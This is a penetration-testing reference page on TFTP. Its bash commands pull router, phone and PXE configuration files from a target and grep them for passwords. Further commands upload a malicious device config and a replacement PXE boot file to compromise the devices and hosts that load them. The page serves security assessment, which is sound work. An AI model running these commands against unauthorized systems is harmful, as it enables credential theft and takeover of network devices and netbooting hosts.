---
title: "File read and write: reading sensitive files and writing to TFTP"
description: "TFTP has no authentication, so any client reads files the server exposes and, where writes are enabled, uploads files. Because TFTP serves device and boot artefacts, reads recover router and phone configs (with credentials), firmware, and PXE files, and writes let an attacker replace a config or boot file that a device will load, influencing or compromising it."
keywords:
  - tftp read
  - tftp write
  - config
  - pxe
  - firmware
---

# File read and write

TFTP's two operations, read and write, are both unauthenticated, so the attack is simply knowing (or guessing) filenames and whether writes are allowed. The value comes from what TFTP serves: network-device configurations, phone provisioning files, firmware images, and PXE boot artefacts. Reading these recovers credentials and configuration; writing, where enabled, lets an attacker replace a file a device will load, turning the TFTP server into a channel to influence or compromise the consuming device.

## Read known artefacts

```bash
# device configs and provisioning files have conventional names; request them
for f in running-config startup-config router.cfg \
         SEPDEFAULT.cnf SIP<mac>.cnf XMLDefault.cnf.xml \
         pxelinux.cfg/default; do
  curl -s tftp://<target>/$f -o "loot_$(echo $f|tr / _)" && echo "got $f"; done
grep -riE 'password|secret|snmp|enable' loot_* 2>/dev/null
```

## Write to influence a consumer

```bash
# if writes are allowed, replace a config/boot file the device will load
echo 'test' | curl -s -T - tftp://<target>/writetest && echo "writable"
curl -s -T malicious-running-config tftp://<target>/running-config   # e.g. push a config
# PXE: write/replace a boot config so a netbooting host loads attacker content
curl -s -T evil-default tftp://<target>/pxelinux.cfg/default
```

## Exploitation notes

- There is no listing, so success depends on filenames; use the conventional names for the device class (Cisco `running-config`/`startup-config`, Cisco phone `SEP<mac>.cnf`, PXE `pxelinux.cfg/default`) and `tftp-enum` for common ones.
- Read configs for embedded credentials (enable/SNMP/VTY passwords, provisioning secrets) that pivot to the device and beyond.
- A writable TFTP server consumed by a device is a compromise channel: replacing a config or boot file influences what the device runs; PXE write is a path to code execution on netbooting hosts.
- TFTP is UDP and connectionless; a firewall may allow it where TCP services are blocked, and the lack of auth means reachability is the whole access control.

## References

- [RFC 1350 (TFTP read/write)](https://datatracker.ietf.org/doc/html/rfc1350)
- [HackTricks: TFTP](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
